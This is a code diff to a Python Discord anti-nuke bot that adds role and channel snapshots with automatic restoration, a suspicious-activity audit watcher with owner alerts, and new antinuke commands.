@@ -47,7 +47,6 @@ nuke_config = {
 active_tokens: dict[str, bool] = {}
 
 # ── premium access store ──────────────────────────────────────
-# {user_id: expiry_timestamp}  — float("inf") = permanent
 premium_users: dict[int, float] = {
     PREMIUM_USER_ID: float("inf")
 }
@@ -56,6 +55,24 @@ premium_users: dict[int, float] = {
 antinuke_enabled:   dict[int, bool] = defaultdict(lambda: True)
 antinuke_whitelist: dict[int, set]  = defaultdict(set)
 action_log: dict[int, dict[int, list]] = defaultdict(lambda: defaultdict(list))
+
+# ── role + channel snapshots for restoration ──────────────────
+# {guild_id: {role_id: {name, color, perms, hoist, mentionable, position}}}
+role_snapshots:    dict[int, dict[int, dict]] = defaultdict(dict)
+# {guild_id: {channel_id: {name, type, category_id, topic, position, overwrites}}}
+channel_snapshots: dict[int, dict[int, dict]] = defaultdict(dict)
+
+# ── restoration cooldown — prevent loops ──────────────────────
+# {guild_id: last_restoration_timestamp}
+restore_cooldown: dict[int, float] = defaultdict(float)
+RESTORE_COOLDOWN_SECS = 10
+
+# ── audit log watcher state ───────────────────────────────────
+# tracks suspicious actions even below threshold
+# {guild_id: {user_id: {action: count}}}
+suspicious_log: dict[int, dict[int, dict]] = defaultdict(lambda: defaultdict(lambda: defaultdict(int)))
+# alert threshold — DM owner when any single action hits this
+SUSPICIOUS_ALERT_AT = 2
 
 THRESHOLDS = {
     "channel_delete": (3, 5),
@@ -101,7 +118,6 @@ def is_premium(user_id: int) -> bool:
         return True
     if time.time() < expiry:
         return True
-    # expired — remove
     premium_users.pop(user_id, None)
     return False
 
@@ -122,6 +138,18 @@ def premium_expiry_str(user_id: int) -> str:
     if hours:   parts.append(f"{hours}h")
     if minutes: parts.append(f"{minutes}m")
     return " ".join(parts) if parts else "< 1m"
+
+def parse_duration(s: str) -> Optional[float]:
+    s = s.strip().lower()
+    if s == "permanent":
+        return float("inf")
+    units = {"d": 86400, "h": 3600, "m": 60}
+    if s[-1] in units:
+        try:
+            return float(s[:-1]) * units[s[-1]]
+        except ValueError:
+            return None
+    return None
 
 async def notify_owner(embed: discord.Embed):
     try:
@@ -226,6 +254,186 @@ def check_threshold(guild_id: int, user_id: int, action: str) -> bool:
 
 
 # ══════════════════════════════════════════════════════════════
+#  SNAPSHOT SYSTEM
+# ══════════════════════════════════════════════════════════════
+
+def snapshot_roles(guild: discord.Guild):
+    """take a full snapshot of all roles in the guild"""
+    role_snapshots[guild.id] = {}
+    for role in guild.roles:
+        if role.is_default():
+            continue
+        role_snapshots[guild.id][role.id] = {
+            "name":        role.name,
+            "color":       role.color.value,
+            "permissions": role.permissions.value,
+            "hoist":       role.hoist,
+            "mentionable": role.mentionable,
+            "position":    role.position,
+        }
+
+def snapshot_channels(guild: discord.Guild):
+    """take a full snapshot of all text channels in the guild"""
+    channel_snapshots[guild.id] = {}
+    for ch in guild.channels:
+        if not isinstance(ch, discord.TextChannel):
+            continue
+        # serialize permission overwrites
+        overwrites = {}
+        for target, overwrite in ch.overwrites.items():
+            key = f"role:{target.id}" if isinstance(target, discord.Role) else f"member:{target.id}"
+            allow, deny = overwrite.pair()
+            overwrites[key] = {"allow": allow.value, "deny": deny.value}
+
+        channel_snapshots[guild.id][ch.id] = {
+            "name":        ch.name,
+            "topic":       ch.topic or "",
+            "position":    ch.position,
+            "category_id": ch.category_id,
+            "overwrites":  overwrites,
+        }
+
+async def restore_role(guild: discord.Guild, role_id: int):
+    """restore a deleted role from snapshot"""
+    snap = role_snapshots[guild.id].get(role_id)
+    if not snap:
+        return
+
+    # skip LH Security role — it's bot-managed
+    if snap["name"] == LOG_ROLE_NAME:
+        return
+
+    try:
+        new_role = await guild.create_role(
+            name=snap["name"],
+            color=discord.Color(snap["color"]),
+            permissions=discord.Permissions(snap["permissions"]),
+            hoist=snap["hoist"],
+            mentionable=snap["mentionable"],
+            reason="[AntiNuke] Role restored after deletion"
+        )
+        # try to set position
+        try:
+            await new_role.edit(position=snap["position"])
+        except Exception:
+            pass
+
+        embed = discord.Embed(
+            title="🔄 AntiNuke — Role Restored",
+            color=0x00aaff,
+            timestamp=discord.utils.utcnow()
+        )
+        embed.add_field(name="Server",    value=f"{guild.name} (`{guild.id}`)", inline=False)
+        embed.add_field(name="Role",      value=snap["name"],                   inline=True)
+        embed.add_field(name="New ID",    value=str(new_role.id),               inline=True)
+        embed.set_footer(text="LH AntiNuke — Role Restoration")
+        await log_antinuke_event(guild, embed)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="⚠️ AntiNuke — Role Restore Failed",
+            description=f"Role: `{snap['name']}`\nError: `{e}`",
+            color=0xff9900,
+            timestamp=discord.utils.utcnow()
+        )
+        embed.set_footer(text="LH AntiNuke — Role Restoration")
+        await log_antinuke_event(guild, embed)
+
+async def restore_channel(guild: discord.Guild, channel_id: int):
+    """restore a deleted channel from snapshot"""
+    snap = channel_snapshots[guild.id].get(channel_id)
+    if not snap:
+        return
+
+    # skip log channel — handled separately
+    if snap["name"] == LOG_CHANNEL_NAME:
+        return
+
+    try:
+        # rebuild overwrites
+        overwrites = {}
+        for key, val in snap["overwrites"].items():
+            kind, oid = key.split(":")
+            oid = int(oid)
+            allow = discord.Permissions(val["allow"])
+            deny  = discord.Permissions(val["deny"])
+            ow    = discord.PermissionOverwrite.from_pair(allow, deny)
+            if kind == "role":
+                target = guild.get_role(oid)
+            else:
+                target = guild.get_member(oid)
+            if target:
+                overwrites[target] = ow
+
+        # find category
+        category = None
+        if snap["category_id"]:
+            category = guild.get_channel(snap["category_id"])
+
+        new_ch = await guild.create_text_channel(
+            name=snap["name"],
+            topic=snap["topic"] or None,
+            category=category,
+            overwrites=overwrites,
+            reason="[AntiNuke] Channel restored after deletion"
+        )
+        try:
+            await new_ch.edit(position=snap["position"])
+        except Exception:
+            pass
+
+        embed = discord.Embed(
+            title="🔄 AntiNuke — Channel Restored",
+            color=0x00aaff,
+            timestamp=discord.utils.utcnow()
+        )
+        embed.add_field(name="Server",  value=f"{guild.name} (`{guild.id}`)", inline=False)
+        embed.add_field(name="Channel", value=f"#{snap['name']}",             inline=True)
+        embed.add_field(name="Mention", value=new_ch.mention,                 inline=True)
+        embed.set_footer(text="LH AntiNuke — Channel Restoration")
+        await log_antinuke_event(guild, embed)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="⚠️ AntiNuke — Channel Restore Failed",
+            description=f"Channel: `#{snap['name']}`\nError: `{e}`",
+            color=0xff9900,
+            timestamp=discord.utils.utcnow()
+        )
+        embed.set_footer(text="LH AntiNuke — Channel Restoration")
+        await log_antinuke_event(guild, embed)
+
+
+async def send_suspicious_alert(guild: discord.Guild, user: discord.Member, action: str, count: int):
+    """DM owner when suspicious activity is detected below ban threshold"""
+    embed = discord.Embed(
+        title="👁️ AntiNuke — Suspicious Activity",
+        description=(
+            "Activity detected below ban threshold.\n"
+            "**No action taken yet** — monitoring."
+        ),
+        color=0xff9900,
+        timestamp=discord.utils.utcnow()
+    )
+    embed.add_field(name="Server", value=f"{guild.name} (`{guild.id}`)", inline=False)
+    embed.add_field(name="User",   value=f"{user} (`{user.id}`)",        inline=False)
+    embed.add_field(name="Action", value=action.replace("_", " ").title(), inline=True)
+    embed.add_field(name="Count",  value=str(count),                     inline=True)
+    embed.set_thumbnail(url=user.display_avatar.url)
+    embed.set_footer(text="LH AntiNuke — Audit Watcher")
+
+    # log to channel
+    log_ch = await get_or_create_log_channel(guild)
+    if log_ch:
+        try:
+            await log_ch.send(embed=embed)
+        except Exception:
+            pass
+    # DM owner
+    await notify_owner(embed)
+
+
+# ══════════════════════════════════════════════════════════════
 #  BOT EVENTS
 # ══════════════════════════════════════════════════════════════
 
@@ -234,17 +442,31 @@ async def on_ready():
     await bot.tree.sync()
     print(f"✅ Online as {bot.user}")
     print(f"✅ In {len(bot.guilds)} servers")
+
+    # set bot status
+    await bot.change_presence(
+        activity=discord.Activity(
+            type=discord.ActivityType.watching,
+            name=f"{len(bot.guilds)} servers | LH Clan"
+        )
+    )
+
     for guild in bot.guilds:
         antinuke_whitelist[guild.id].add(PREMIUM_USER_ID)
         antinuke_whitelist[guild.id].add(bot.user.id)
         if guild.owner:
             antinuke_whitelist[guild.id].add(guild.owner.id)
+        # take initial snapshots
+        snapshot_roles(guild)
+        snapshot_channels(guild)
+
 
 async def setup_hook():
     bot.add_view(VerifyButton())
     bot.add_view(HelpView())
 
 bot.setup_hook = setup_hook
+
 
 @bot.event
 async def on_guild_join(guild: discord.Guild):
@@ -253,6 +475,15 @@ async def on_guild_join(guild: discord.Guild):
     if guild.owner:
         antinuke_whitelist[guild.id].add(guild.owner.id)
     await get_or_create_log_channel(guild)
+    snapshot_roles(guild)
+    snapshot_channels(guild)
+    await bot.change_presence(
+        activity=discord.Activity(
+            type=discord.ActivityType.watching,
+            name=f"{len(bot.guilds)} servers | LH Clan"
+        )
+    )
+
 
 @bot.event
 async def on_guild_remove(guild: discord.Guild):
@@ -267,87 +498,226 @@ async def on_guild_remove(guild: discord.Guild):
         timestamp=discord.utils.utcnow()
     )
     await notify_owner(embed)
+    await bot.change_presence(
+        activity=discord.Activity(
+            type=discord.ActivityType.watching,
+            name=f"{len(bot.guilds)} servers | LH Clan"
+        )
+    )
 
 
 # ══════════════════════════════════════════════════════════════
-#  ANTINUKE LISTENERS
+#  ANTINUKE LISTENERS — UPGRADED
 # ══════════════════════════════════════════════════════════════
 
 @bot.event
-async def on_guild_channel_delete(channel):
-    guild = channel.guild
-    if not antinuke_enabled[guild.id]: return
-    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
-        if entry.user.id in antinuke_whitelist[guild.id]: return
-        if entry.user.id == bot.user.id: return
-        if check_threshold(guild.id, entry.user.id, "channel_delete"):
-            await antinuke_punish(guild, entry.user, "Mass channel delete detected")
-        break
+async def on_guild_role_create(role):
+    """keep snapshot fresh on new roles"""
+    guild = role.guild
+    if not antinuke_enabled[guild.id]:
+        return
+    snapshot_roles(guild)
+
 
 @bot.event
-async def on_guild_channel_create(channel):
-    guild = channel.guild
-    if not antinuke_enabled[guild.id]: return
-    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_create):
-        if entry.user.id in antinuke_whitelist[guild.id]: return
-        if entry.user.id == bot.user.id: return
-        if check_threshold(guild.id, entry.user.id, "channel_create"):
-            await antinuke_punish(guild, entry.user, "Mass channel create detected")
-        break
+async def on_guild_role_update(before, after):
+    """re-snapshot on role update, watch for permission escalation"""
+    guild = after.guild
+    if not antinuke_enabled[guild.id]:
+        return
+    snapshot_roles(guild)
+
+    # watch for anyone giving themselves/others admin
+    if not before.permissions.administrator and after.permissions.administrator:
+        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_update):
+            if entry.user.id in antinuke_whitelist[guild.id]:
+                return
+            if entry.user.id == bot.user.id:
+                return
+
+            suspicious_log[guild.id][entry.user.id]["role_update"] += 1
+            count = suspicious_log[guild.id][entry.user.id]["role_update"]
+
+            if check_threshold(guild.id, entry.user.id, "role_update"):
+                await antinuke_punish(guild, entry.user, "Suspicious permission escalation")
+            elif count >= SUSPICIOUS_ALERT_AT:
+                await send_suspicious_alert(guild, entry.user, "role_update", count)
+            break
+
 
 @bot.event
 async def on_guild_role_delete(role):
     guild = role.guild
-    if not antinuke_enabled[guild.id]: return
+    if not antinuke_enabled[guild.id]:
+        return
+
     async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
-        if entry.user.id in antinuke_whitelist[guild.id]: return
-        if entry.user.id == bot.user.id: return
+        if entry.user.id in antinuke_whitelist[guild.id]:
+            # whitelisted user deleted it — still update snapshot
+            snapshot_roles(guild)
+            return
+        if entry.user.id == bot.user.id:
+            snapshot_roles(guild)
+            return
+
+        suspicious_log[guild.id][entry.user.id]["role_delete"] += 1
+        count = suspicious_log[guild.id][entry.user.id]["role_delete"]
+
         if check_threshold(guild.id, entry.user.id, "role_delete"):
             await antinuke_punish(guild, entry.user, "Mass role delete detected")
+        else:
+            # below threshold — alert and restore
+            if count >= SUSPICIOUS_ALERT_AT:
+                await send_suspicious_alert(guild, entry.user, "role_delete", count)
+
+            # restore the deleted role
+            now = time.time()
+            if now - restore_cooldown[guild.id] > RESTORE_COOLDOWN_SECS:
+                restore_cooldown[guild.id] = now
+                await restore_role(guild, role.id)
+
+        snapshot_roles(guild)
         break
+
+
+@bot.event
+async def on_guild_channel_create(channel):
+    guild = channel.guild
+    if not antinuke_enabled[guild.id]:
+        return
+    # re-snapshot so new channel is tracked
+    if isinstance(channel, discord.TextChannel):
+        snapshot_channels(guild)
+
+    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_create):
+        if entry.user.id in antinuke_whitelist[guild.id]:
+            return
+        if entry.user.id == bot.user.id:
+            return
+
+        suspicious_log[guild.id][entry.user.id]["channel_create"] += 1
+        count = suspicious_log[guild.id][entry.user.id]["channel_create"]
+
+        if check_threshold(guild.id, entry.user.id, "channel_create"):
+            await antinuke_punish(guild, entry.user, "Mass channel create detected")
+        elif count >= SUSPICIOUS_ALERT_AT:
+            await send_suspicious_alert(guild, entry.user, "channel_create", count)
+        break
+
+
+@bot.event
+async def on_guild_channel_delete(channel):
+    guild = channel.guild
+    if not antinuke_enabled[guild.id]:
+        return
+
+    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
+        if entry.user.id in antinuke_whitelist[guild.id]:
+            snapshot_channels(guild)
+            return
+        if entry.user.id == bot.user.id:
+            snapshot_channels(guild)
+            return
+
+        suspicious_log[guild.id][entry.user.id]["channel_delete"] += 1
+        count = suspicious_log[guild.id][entry.user.id]["channel_delete"]
+
+        if check_threshold(guild.id, entry.user.id, "channel_delete"):
+            await antinuke_punish(guild, entry.user, "Mass channel delete detected")
+        else:
+            if count >= SUSPICIOUS_ALERT_AT:
+                await send_suspicious_alert(guild, entry.user, "channel_delete", count)
+
+            # restore the deleted channel
+            if isinstance(channel, discord.TextChannel):
+                now = time.time()
+                if now - restore_cooldown[guild.id] > RESTORE_COOLDOWN_SECS:
+                    restore_cooldown[guild.id] = now
+                    await restore_channel(guild, channel.id)
+
+        snapshot_channels(guild)
+        break
+
 
 @bot.event
 async def on_member_remove(member):
     guild = member.guild
-    if not antinuke_enabled[guild.id]: return
+    if not antinuke_enabled[guild.id]:
+        return
     async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
-        if entry.target.id != member.id: break
-        if entry.user.id in antinuke_whitelist[guild.id]: return
-        if entry.user.id == bot.user.id: return
+        if entry.target.id != member.id:
+            break
+        if entry.user.id in antinuke_whitelist[guild.id]:
+            return
+        if entry.user.id == bot.user.id:
+            return
+
+        suspicious_log[guild.id][entry.user.id]["kick"] += 1
+        count = suspicious_log[guild.id][entry.user.id]["kick"]
+
         if check_threshold(guild.id, entry.user.id, "kick"):
             await antinuke_punish(guild, entry.user, "Mass kick detected")
+        elif count >= SUSPICIOUS_ALERT_AT:
+            await send_suspicious_alert(guild, entry.user, "kick", count)
         break
+
 
 @bot.event
 async def on_member_ban(guild, user):
-    if not antinuke_enabled[guild.id]: return
+    if not antinuke_enabled[guild.id]:
+        return
     async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
-        if entry.user.id in antinuke_whitelist[guild.id]: return
-        if entry.user.id == bot.user.id: return
+        if entry.user.id in antinuke_whitelist[guild.id]:
+            return
+        if entry.user.id == bot.user.id:
+            return
+
+        suspicious_log[guild.id][entry.user.id]["ban"] += 1
+        count = suspicious_log[guild.id][entry.user.id]["ban"]
+
         if check_threshold(guild.id, entry.user.id, "ban"):
             offender = guild.get_member(entry.user.id)
             if offender:
                 await antinuke_punish(guild, offender, "Mass ban detected")
+        elif count >= SUSPICIOUS_ALERT_AT:
+            offender = guild.get_member(entry.user.id)
+            if offender:
+                await send_suspicious_alert(guild, offender, "ban", count)
         break
+
 
 @bot.event
 async def on_webhooks_update(channel):
     guild = channel.guild
-    if not antinuke_enabled[guild.id]: return
+    if not antinuke_enabled[guild.id]:
+        return
     async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.webhook_create):
-        if entry.user.id in antinuke_whitelist[guild.id]: return
-        if entry.user.id == bot.user.id: return
+        if entry.user.id in antinuke_whitelist[guild.id]:
+            return
+        if entry.user.id == bot.user.id:
+            return
+
+        suspicious_log[guild.id][entry.user.id]["webhook_create"] += 1
+        count = suspicious_log[guild.id][entry.user.id]["webhook_create"]
+
         if check_threshold(guild.id, entry.user.id, "webhook_create"):
             await antinuke_punish(guild, entry.user, "Mass webhook create detected")
+        elif count >= SUSPICIOUS_ALERT_AT:
+            await send_suspicious_alert(guild, entry.user, "webhook_create", count)
         break
+
 
 @bot.event
 async def on_member_join(member):
     guild = member.guild
-    if not antinuke_enabled[guild.id]: return
-    if not member.bot: return
-    if member.id in antinuke_whitelist[guild.id]: return
-    if member.id == bot.user.id: return
+    if not antinuke_enabled[guild.id]:
+        return
+    if not member.bot:
+        return
+    if member.id in antinuke_whitelist[guild.id]:
+        return
+    if member.id == bot.user.id:
+        return
     try:
         await member.kick(reason="[AntiNuke] Unauthorized bot join")
         embed = discord.Embed(
@@ -363,6 +733,274 @@ async def on_member_join(member):
         await log_antinuke_event(guild, embed)
     except Exception:
         pass
+
+
+@bot.event
+async def on_guild_update(before, after):
+    """watch for suspicious guild-level changes"""
+    guild = after
+    if not antinuke_enabled[guild.id]:
+        return
+    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.guild_update):
+        if entry.user.id in antinuke_whitelist[guild.id]:
+            return
+        if entry.user.id == bot.user.id:
+            return
+
+        suspicious_log[guild.id][entry.user.id]["guild_update"] += 1
+        count = suspicious_log[guild.id][entry.user.id]["guild_update"]
+
+        if count >= SUSPICIOUS_ALERT_AT:
+            await send_suspicious_alert(guild, entry.user, "guild_update", count)
+        break
+
+
+# ══════════════════════════════════════════════════════════════
+#  ANTINUKE COMMANDS — UPGRADED
+# ══════════════════════════════════════════════════════════════
+
+@bot.command(name="antinuke")
+async def antinuke_cmd(ctx, action: str = None, *, args: str = None):
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+
+    guild = ctx.guild
+
+    if not action:
+        await ctx.send("❌ Usage: `!antinuke <on|off|status|whitelist|setup|snapshot|suspicious>`", delete_after=5)
+        return
+
+    action = action.lower()
+
+    # ── on ────────────────────────────────────────────────────
+    if action == "on":
+        if not ctx.author.guild_permissions.administrator:
+            await ctx.send("❌ Administrator required.", delete_after=5)
+            return
+        antinuke_enabled[guild.id] = True
+        # take fresh snapshots on enable
+        snapshot_roles(guild)
+        snapshot_channels(guild)
+        embed = discord.Embed(
+            title="🛡️ AntiNuke Enabled",
+            description=(
+                f"**{guild.name}** is now protected.\n\n"
+                "**Watching:**\n"
+                "• Mass channel deletes/creates → auto-ban + restore\n"
+                "• Mass role deletes → auto-ban + restore\n"
+                "• Permission escalation → auto-ban\n"
+                "• Mass kicks & bans → auto-ban\n"
+                "• Unauthorized webhook creates → auto-ban\n"
+                "• Unauthorized bot joins → auto-kick\n"
+                "• Suspicious guild updates → owner alert\n\n"
+                "**Audit Watcher:** alerts owner at 2+ suspicious actions\n"
+                "**Restoration:** deleted roles/channels auto-restored\n\n"
+                f"Logs → `#{LOG_CHANNEL_NAME}` (hidden channel)"
+            ),
+            color=0x00ff00,
+            timestamp=discord.utils.utcnow()
+        )
+        embed.set_footer(text="Only premium user can disable AntiNuke")
+        try:
+            await ctx.author.send(embed=embed)
+            await ctx.send("🛡️ AntiNuke enabled + snapshots taken. Details in DMs.", delete_after=5)
+        except discord.Forbidden:
+            msg = await ctx.send(embed=embed)
+            await asyncio.sleep(15)
+            try:
+                await msg.delete()
+            except Exception:
+                pass
+        return
+
+    # ── off — premium only ────────────────────────────────────
+    if action == "off":
+        if ctx.author.id != PREMIUM_USER_ID:
+            await ctx.send(embed=discord.Embed(
+                title="❌ Access Denied",
+                description="Only the **premium user** can disable AntiNuke.",
+                color=0xff0000
+            ), delete_after=5)
+            return
+        antinuke_enabled[guild.id] = False
+        embed = discord.Embed(
+            title="⚠️ AntiNuke Disabled",
+            description=(
+                f"Protection disabled for **{guild.name}**.\n"
+                "Re-enable with `!antinuke on`."
+            ),
+            color=0xff9900,
+            timestamp=discord.utils.utcnow()
+        )
+        try:
+            await ctx.author.send(embed=embed)
+            await ctx.send("⚠️ AntiNuke disabled.", delete_after=5)
+        except discord.Forbidden:
+            msg = await ctx.send(embed=embed)
+            await asyncio.sleep(10)
+            try:
+                await msg.delete()
+            except Exception:
+                pass
+        return
+
+    # ── status ────────────────────────────────────────────────
+    if action == "status":
+        if not ctx.author.guild_permissions.administrator:
+            await ctx.send("❌ Administrator required.", delete_after=5)
+            return
+        status = "🟢 ENABLED" if antinuke_enabled[guild.id] else "🔴 DISABLED"
+        wl     = antinuke_whitelist[guild.id]
+        wl_str = "\n".join([f"<@{uid}> (`{uid}`)" for uid in wl]) or "None"
+        roles_snapped    = len(role_snapshots.get(guild.id, {}))
+        channels_snapped = len(channel_snapshots.get(guild.id, {}))
+
+        embed = discord.Embed(
+            title="🛡️ AntiNuke Status",
+            color=0x00ff00 if antinuke_enabled[guild.id] else 0xff0000,
+            timestamp=discord.utils.utcnow()
+        )
+        embed.add_field(name="Status",   value=f"**{status}**",          inline=False)
+        embed.add_field(name="Server",   value=guild.name,               inline=True)
+        embed.add_field(name="Members",  value=str(guild.member_count),  inline=True)
+        embed.add_field(
+            name="Snapshots",
+            value=(
+                f"Roles snapped: **{roles_snapped}**\n"
+                f"Channels snapped: **{channels_snapped}**"
+            ),
+            inline=False
+        )
+        embed.add_field(
+            name="Thresholds (auto-ban)",
+            value=(
+                "• Channel delete: **3 in 5s**\n"
+                "• Channel create: **3 in 5s**\n"
+                "• Role delete:    **3 in 5s**\n"
+                "• Kick:           **3 in 5s**\n"
+                "• Ban:            **2 in 5s**\n"
+                "• Webhook create: **2 in 10s**"
+            ),
+            inline=False
+        )
+        embed.add_field(
+            name="Audit Watcher (alert at)",
+            value=f"**{SUSPICIOUS_ALERT_AT}** actions of same type",
+            inline=False
+        )
+        embed.add_field(name="Whitelist", value=wl_str, inline=False)
+        embed.set_footer(text="LH AntiNuke System | Premium user can disable")
+        try:
+            await ctx.author.send(embed=embed)
+            await ctx.send("🛡️ Status sent to your DMs.", delete_after=5)
+        except discord.Forbidden:
+            msg = await ctx.send(embed=embed)
+            await asyncio.sleep(20)
+            try:
+                await msg.delete()
+            except Exception:
+                pass
+        return
+
+    # ── whitelist ─────────────────────────────────────────────
+    if action == "whitelist":
+        if ctx.author.id != PREMIUM_USER_ID:
+            await ctx.send("❌ Only premium user can manage whitelist.", delete_after=5)
+            return
+        if not args or len(args.split()) < 2:
+            await ctx.send("❌ Usage: `!antinuke whitelist <add|remove> <userID>`", delete_after=5)
+            return
+        parts = args.split()
+        sub   = parts[0].lower()
+        try:
+            target_id = int(parts[1])
+        except ValueError:
+            await ctx.send("❌ Invalid user ID.", delete_after=5)
+            return
+        if sub == "add":
+            antinuke_whitelist[guild.id].add(target_id)
+            await ctx.send(f"✅ `{target_id}` added to whitelist.", delete_after=5)
+        elif sub == "remove":
+            antinuke_whitelist[guild.id].discard(target_id)
+            await ctx.send(f"✅ `{target_id}` removed from whitelist.", delete_after=5)
+        else:
+            await ctx.send("❌ Usage: `!antinuke whitelist <add|remove> <userID>`", delete_after=5)
+        return
+
+    # ── setup ─────────────────────────────────────────────────
+    if action == "setup":
+        if not ctx.author.guild_permissions.administrator:
+            await ctx.send("❌ Administrator required.", delete_after=5)
+            return
+        ch = await get_or_create_log_channel(guild)
+        if ch:
+            await ctx.send(
+                f"✅ Log channel ready: {ch.mention} — only `{LOG_ROLE_NAME}` can see it.",
+                delete_after=10
+            )
+        else:
+            await ctx.send("❌ Failed to create log channel. Check bot permissions.", delete_after=5)
+        return
+
+    # ── snapshot — force refresh ──────────────────────────────
+    if action == "snapshot":
+        if not ctx.author.guild_permissions.administrator:
+            await ctx.send("❌ Administrator required.", delete_after=5)
+            return
+        snapshot_roles(guild)
+        snapshot_channels(guild)
+        await ctx.send(
+            f"✅ Snapshots refreshed — "
+            f"`{len(role_snapshots[guild.id])}` roles, "
+            f"`{len(channel_snapshots[guild.id])}` channels saved.",
+            delete_after=8
+        )
+        return
+
+    # ── suspicious — view audit watcher log ───────────────────
+    if action == "suspicious":
+        if not ctx.author.guild_permissions.administrator:
+            await ctx.send("❌ Administrator required.", delete_after=5)
+            return
+        log = suspicious_log.get(guild.id, {})
+        if not log:
+            await ctx.send("✅ No suspicious activity recorded.", delete_after=8)
+            return
+
+        embed = discord.Embed(
+            title="👁️ Suspicious Activity Log",
+            color=0xff9900,
+            timestamp=discord.utils.utcnow()
+        )
+        embed.add_field(name="Server", value=guild.name, inline=False)
+
+        for user_id, actions in log.items():
+            if not actions:
+                continue
+            member = guild.get_member(user_id)
+            name   = str(member) if member else f"ID: {user_id}"
+            lines  = "\n".join([f"• {a.replace('_', ' ').title()}: **{c}x**" for a, c in actions.items()])
+            embed.add_field(name=name, value=lines, inline=True)
+
+        embed.set_footer(text="LH AntiNuke — Audit Watcher")
+        try:
+            await ctx.author.send(embed=embed)
+            await ctx.send("👁️ Suspicious log sent to your DMs.", delete_after=5)
+        except discord.Forbidden:
+            msg = await ctx.send(embed=embed)
+            await asyncio.sleep(20)
+            try:
+                await msg.delete()
+            except Exception:
+                pass
+        return
+
+    await ctx.send(
+        "❌ Unknown action. Use: `on`, `off`, `status`, `whitelist`, `setup`, `snapshot`, `suspicious`",
+        delete_after=5
+    )
 
 
 # ══════════════════════════════════════════════════════════════
@@ -393,8 +1031,10 @@ def build_free_embed() -> discord.Embed:
         name="━━━━━━ 🛡️ ANTINUKE ━━━━━━",
         value=(
             "`!antinuke on` — enable protection 🔒\n"
-            "`!antinuke status` — view status 🔒\n"
-            "`!antinuke setup` — create log channel 🔒"
+            "`!antinuke status` — view status + snapshots 🔒\n"
+            "`!antinuke setup` — create hidden log channel 🔒\n"
+            "`!antinuke snapshot` — refresh role/channel snapshots 🔒\n"
+            "`!antinuke suspicious` — view audit watcher log 🔒"
         ),
         inline=False
     )
@@ -423,8 +1063,8 @@ def build_free_embed() -> discord.Embed:
 
 
 def build_premium_embed(user_id: int) -> discord.Embed:
-    has  = is_premium(user_id)
-    exp  = premium_expiry_str(user_id) if has else "No Access"
+    has   = is_premium(user_id)
+    exp   = premium_expiry_str(user_id) if has else "No Access"
     color = 0xffd700 if has else 0x555555
 
     embed = discord.Embed(
@@ -479,10 +1119,10 @@ def build_premium_embed(user_id: int) -> discord.Embed:
     embed.add_field(
         name="━━━━━━ 🎁 PREMIUM GIFTING ━━━━━━",
         value=(
-            "`!givepremium <userID> <duration>` — gift premium ⭐\n"
-            "`!revokepremium <userID>` — revoke premium ⭐\n"
-            "`!premiumlist` — list all premium users ⭐\n\n"
-            "Duration examples: `1d`, `7d`, `30d`, `permanent`"
+            "`!givepremium <userID> <duration>` ⭐\n"
+            "`!revokepremium <userID>` ⭐\n"
+            "`!premiumlist` ⭐\n\n"
+            "Duration: `1d`, `7d`, `30d`, `permanent`"
         ),
         inline=False
     )
@@ -514,7 +1154,7 @@ class HelpView(discord.ui.View):
     @discord.ui.button(
         label="Premium Commands",
         emoji="👑",
-        style=discord.ButtonStyle.gold if hasattr(discord.ButtonStyle, 'gold') else discord.ButtonStyle.green,
+        style=discord.ButtonStyle.green,
         custom_id="help_premium"
     )
     async def premium_commands(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -526,10 +1166,6 @@ class HelpView(discord.ui.View):
         pass
 
 
-# ══════════════════════════════════════════════════════════════
-#  HELP COMMAND
-# ══════════════════════════════════════════════════════════════
-
 @bot.command(name="help")
 async def help_cmd(ctx):
     try:
@@ -537,22 +1173,17 @@ async def help_cmd(ctx):
     except Exception:
         pass
 
-    # default view shows free commands
     embed = build_free_embed()
     view  = HelpView()
 
-    # try ephemeral-style: send to channel but only visible to them
-    # discord prefix commands can't do true ephemeral — send then delete after timeout
     try:
         msg = await ctx.send(embed=embed, view=view)
-        # auto-delete after 2 minutes (view timeout)
         await asyncio.sleep(120)
         try:
             await msg.delete()
         except Exception:
             pass
     except Exception:
-        # fallback: DM
         try:
             await ctx.author.send(embed=embed, view=view)
             await ctx.send("📬 Help sent to your DMs.", delete_after=5)
@@ -563,24 +1194,6 @@ async def help_cmd(ctx):
 # ══════════════════════════════════════════════════════════════
 #  PREMIUM GIFTING
 # ══════════════════════════════════════════════════════════════
-
-def parse_duration(s: str) -> Optional[float]:
-    """
-    parses duration string → seconds.
-    accepts: 1d, 7d, 24h, 60m, permanent
-    returns None on bad input, float("inf") for permanent
-    """
-    s = s.strip().lower()
-    if s == "permanent":
-        return float("inf")
-    units = {"d": 86400, "h": 3600, "m": 60}
-    if s[-1] in units:
-        try:
-            return float(s[:-1]) * units[s[-1]]
-        except ValueError:
-            return None
-    return None
-
 
 @bot.command(name="givepremium")
 async def give_premium(ctx, user_id: str = None, duration: str = None):
@@ -599,18 +1212,14 @@ async def give_premium(ctx, user_id: str = None, duration: str = None):
 
     if not user_id or not duration:
         await ctx.send(
-            "❌ Usage: `!givepremium <userID> <duration>`\n"
-            "Duration: `1d`, `7d`, `30d`, `permanent`",
+            "❌ Usage: `!givepremium <userID> <duration>`\nDuration: `1d`, `7d`, `30d`, `permanent`",
             delete_after=10
         )
         return
 
     secs = parse_duration(duration)
     if secs is None:
-        await ctx.send(
-            "❌ Invalid duration. Use: `1d`, `7d`, `30d`, `24h`, `permanent`",
-            delete_after=5
-        )
+        await ctx.send("❌ Invalid duration. Use: `1d`, `7d`, `30d`, `24h`, `permanent`", delete_after=5)
         return
 
     try:
